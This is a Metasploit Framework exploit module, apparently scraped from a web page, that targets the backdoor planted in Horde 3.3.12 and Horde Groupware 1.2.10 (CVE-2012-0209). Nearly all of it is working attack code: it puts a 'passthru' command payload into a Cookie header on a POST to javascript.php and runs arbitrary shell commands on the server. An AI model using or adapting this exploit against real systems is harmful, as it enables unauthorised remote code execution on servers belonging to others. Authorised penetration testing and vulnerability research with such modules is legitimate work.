# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::HttpClient
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Horde 3.3.12 Backdoor Arbitrary PHP Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits an arbitrary PHP code execution vulnerability introduced
                as a backdoor into Horde 3.3.12 and Horde Groupware 1.2.10.
            },
            &#039;Author&#039;         => [
                &#039;Eric Romang&#039;,  # first public PoC
                &#039;jduck&#039;         # Metasploit module
            ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2012-0209&#039;],
                    [ &#039;URL&#039;, &#039;http://dev.horde.org/h/jonah/stories/view.php?channel_id=1&id=155&#039; ],
                    [ &#039;URL&#039;, &#039;http://eromang.zataz.com/2012/02/15/cve-2012-0209-horde-backdoor-analysis/&#039; ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x0a\x0d",
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 4096,
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                        }
                },
            &#039;Platform&#039;       => [ &#039;unix&#039;, &#039;linux&#039; ],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;DefaultTarget&#039;  => 0,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DisclosureDate&#039; => &#039;Feb 13 2012&#039;
            ))
            register_options(
                [
                    OptString.new(&#039;URI&#039;, [true, "Path to Horde installation", "/horde"]),
                    OptString.new(&#039;APP&#039;, [true, "App parameter required by javascript.php (must be active)", "horde"]),
                ], self.class)
    end
    def exploit
        # Make sure the URI begins with a slash
        uri = datastore[&#039;URI&#039;]
        if uri[0,1] != &#039;/&#039;
            uri = &#039;/&#039; + uri
        end
        # Make sure the URI ends without a slash, because it&#039;s already part of the URI
        if uri[-1, 1] == &#039;/&#039;
            uri = uri[0, uri.length-1]
        end
        function = "passthru"
        key = Rex::Text.rand_text_alpha(6)
        arguments = "echo #{key}`"+payload.raw+"`#{key}"
        res = send_request_cgi({
            &#039;uri&#039;     => uri + "/services/javascript.php",
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;ctype&#039;   => &#039;application/x-www-form-urlencoded&#039;,
            &#039;data&#039;    => "app="+datastore[&#039;APP&#039;]+"&file=open_calendar.js",
            &#039;headers&#039; =>
            {
                &#039;Cookie&#039; => "href="+function+":"+arguments,
                &#039;Connection&#039; => &#039;Close&#039;,
            }
        }) #default timeout, we don&#039;t care about the response
        if (res)
            print_status("The server returned: #{res.code} #{res.message}")
        end
        resp = res.body.split(key)
        if resp and resp[1]
            print_status(resp[1])
        else
            print_error("No response found")
        end
        handler
    end
end



